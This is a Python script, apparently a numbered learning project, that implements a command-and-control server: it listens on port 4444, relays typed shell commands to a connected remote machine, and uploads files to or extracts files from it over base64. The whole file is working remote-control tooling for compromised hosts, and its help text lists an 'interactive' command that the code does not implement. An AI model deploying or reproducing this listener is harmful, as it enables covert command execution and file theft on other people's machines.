import argparse
#!/usr/bin/env python3
"""
Project #17: Interactive C2 Server (Listener Framework)
Architecture: In-Stream Command Multiplexing and Base64 File Extraction.
"""

import socket
import sys
import base64
import os

G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; R = "\033[91m"; BOLD = "\033[1m"; RESET = "\033[0m"

BANNER = """
======================================================================
  C2 CORE INTERACTION LISTENER ENGINE — FULL FILE MANAGEMENT LAYER
======================================================================
"""

def process_file_upload(conn, local_path, remote_path):
    """Encodes a local file into base64 segments and pushes it down the socket line."""
    if not os.path.exists(local_path):
        print(f"{R}[!] Local payload asset file missing at: {local_path}{RESET}")
        return

    print(f"[*] Compiling transmission buffers for {local_path}...")
    with open(local_path, "rb") as f:
        file_bytes = f.read()
    
    encoded_payload = base64.b64encode(file_bytes).decode('utf-8')
    
    # Send structural meta-instruction framing packet to client node
    instruction = f"__UPLOAD__:{remote_path}:{encoded_payload}"
    conn.sendall(instruction.encode('utf-8') + b"\n")
    
    # Gather execution confirmation report status from remote host
    response = conn.recv(4096).decode('utf-8').strip()
    print(f"   👉 {G}{response}{RESET}")

def process_file_download(conn, remote_path, local_path):
    """Issues a pull query command to extract binary files from the client."""
    print(f"[*] Requesting extraction stream for remote asset file: {remote_path}")
    instruction = f"__DOWNLOAD__:{remote_path}"
    conn.sendall(instruction.encode('utf-8') + b"\n")
    
    # Read response package header array data
    raw_response = b""
    while True:
        chunk = conn.recv(65536)
        raw_response += chunk
        if b"\n" in chunk or not chunk:
            break
            
    response_str = raw_response.decode('utf-8').strip()
    
    if response_str.startswith("ERROR:"):
        print(f"{R}[!] Remote file pull extraction process rejected: {response_str}{RESET}")
        return

    try:
        decoded_bytes = base64.b64decode(response_str)
        with open(local_path, "wb") as f:
            f.write(decoded_bytes)
        print(f"🎉 [SUCCESS] Extracted target file safely written locally to disk path: {local_path}")
    except Exception as e:
        print(f"{R}[!] Failed to parse inbound transmission encoding matrix: {e}{RESET}")

def launch_listener(host, port):
    print(BANNER)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow instant socket address reuse to prevent address-already-in-use errors
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(1)
        print(f"[*] Bound listener safely. Awaiting inbound device synchronization on {host}:{port}...")
    except Exception as e:
        print(f"{R}[!] Binding allocation failure: {e}{RESET}")
        sys.exit(1)

    conn, addr = server.accept()
    print(f"{G}[+] Connection established from node anchor target point -> {addr[0]}:{addr[1]}{RESET}")
    print("[*] Entering interactive terminal frame cycle mode. Type 'help' to review storage macros.")
    print("-" * 75)

    while True:
        try:
            cmd = input(f"{C}{BOLD}C2_SHELL:{RESET} ")
            if not cmd.strip():
                continue
                
            cmd_parts = cmd.split()
            
            # --- Inline File Multiplexing Engine Condition Checks ---
            if cmd_parts[0] == "upload":
                if len(cmd_parts) < 3:
                    print(f"{Y}Usage: upload <local_path> <remote_target_path>{RESET}")
                    continue
                process_file_upload(conn, cmd_parts[1], cmd_parts[2])
                continue
                
            elif cmd_parts[0] == "download":
                if len(cmd_parts) < 3:
                    print(f"{Y}Usage: download <remote_path> <local_destination_path>{RESET}")
                    continue
                process_file_download(conn, cmd_parts[1], cmd_parts[2])
                continue
                
            elif cmd == "exit":
                conn.sendall(b"exit\n")
                break
                
            elif cmd == "help":
                print(f"\n{BOLD}C2 STORAGE AND TERMINAL COMMAND MACROS:{RESET}")
                print("  upload <local> <remote>   - Push local file asset down stream to client node storage.")
                print("  download <remote> <local> - Pull distant binary or configuration log to local device.")
                print("  interactive               - Spawn full interactive Unix pseudoterminal engine loop.")
                print("  exit                      - Cleanly terminate communication links and sockets.\n")
                continue

            # Standard pipeline stream transmission
            conn.sendall(cmd.encode('utf-8') + b"\n")
            response = conn.recv(1024 * 16).decode('utf-8')
            print(response, end="")
            
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Input context break registered. Use 'exit' command to tear down channels safely.{RESET}")

    conn.close()
    server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 Shell Server")
    parser.add_argument("--host", default="0.0.0.0", help="Binding interface address entry")
    parser.add_argument("--port", type=int, default=4444, help="Target listening terminal port node")
    args = parser.parse_args()
    launch_listener(args.host, args.port)